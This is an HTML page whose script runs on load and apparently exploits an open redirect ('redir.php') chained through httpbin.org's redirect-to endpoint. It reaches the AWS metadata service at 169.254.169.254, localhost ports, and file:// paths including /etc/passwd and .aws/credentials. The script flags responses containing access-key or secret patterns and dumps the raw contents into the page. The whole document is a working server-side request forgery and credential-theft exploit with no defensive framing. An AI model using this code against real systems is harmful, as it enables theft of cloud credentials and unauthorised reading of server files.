<!DOCTYPE html>
<html>
<head>
    <title>AWS Token Extraction</title>
</head>
<body>
    <h1>üîê AWS Metadata Token Extraction</h1>
    <div id="results"></div>
    
    <script>
        var results = "";
        
        // Try to extract AWS metadata token using httpbin.org PUT capabilities
        var tokenTests = [
            // Try httpbin.org PUT to get AWS token
            'http://httpbin.org/put',
            'http://httpbin.org/anything',
            'http://httpbin.org/post',
            
            // Try specific AWS token endpoints
            'http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/api/token',
            'http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/api/',
            
            // Try localhost endpoints that might have tokens/credentials stored
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/token',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/api/token',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/.aws/',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/aws/',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/credentials.json',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/config.json',
            
            // Try common AWS credential file locations on localhost
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/var/www/html/.env',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/home/ubuntu/.aws/credentials',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/root/.aws/credentials',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/etc/environment',
            
            // Try to find if there are other services on localhost
            'http://httpbin.org/redirect-to?url=http://127.0.0.1:8080/',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1:3000/',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1:9000/',
            
            // Try to access different paths on the main localhost service
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/index.php',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/releasenotes.txt',
            
            // Try file:// protocol via httpbin.org redirect
            'http://httpbin.org/redirect-to?url=file:///etc/passwd',
            'http://httpbin.org/redirect-to?url=file:///proc/version',
            'http://httpbin.org/redirect-to?url=file:///var/www/html/.env',
            'http://httpbin.org/redirect-to?url=file:///home/ubuntu/.aws/credentials',
        ];
        
        for(var i = 0; i < tokenTests.length; i++) {
            try {
                results += "<h3>üîç " + (i+1) + ": " + tokenTests[i] + "</h3>";
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(tokenTests[i]), false);
                xhr.send();
                
                if(xhr.responseText && xhr.responseText.trim().length > 5) {
                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>‚úÖ RESPONSE: " + xhr.responseText.length + " bytes</div>";
                    
                    // Look for any AWS-related content
                    var text = xhr.responseText.toLowerCase();
                    if(text.includes('aws_access_key') || text.includes('aws_secret') || text.includes('accesskeyid')) {
                        results += "<div style='background:#ff0000;color:white;padding:10px;border:3px solid red;'>üö® AWS CREDENTIALS DETECTED! üö®</div>";
                    }
                    if(text.includes('token') || text.includes('session')) {
                        results += "<div style='background:#ffa500;color:white;padding:8px;'>üîê TOKEN/SESSION FOUND!</div>";
                    }
                    if(text.includes('asia') || text.includes('akia') || text.includes('secret')) {
                        results += "<div style='background:#74c0fc;padding:8px;'>üîë CREDENTIAL PATTERN DETECTED!</div>";
                    }
                    if(text.includes('root:') || text.includes('ubuntu:') || text.includes('/bin/bash')) {
                        results += "<div style='background:#9c88ff;padding:8px;'>üìÅ SYSTEM FILE ACCESS!</div>";
                    }
                    
                    results += "<div style='background:#f0f0f0;padding:10px;max-height:200px;overflow:scroll;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr.responseText + "</div>";
                } else {
                    results += "<div style='background:#ffe8e8;padding:3px;'>‚ùå No response</div>";
                }
            } catch(e) {
                results += "<div style='background:#ffe8e8;padding:3px;'>‚ùå " + e.message.substring(0, 50) + "</div>";
            }
        }
        
        document.getElementById("results").innerHTML = results;
    </script>
</body>
</html>
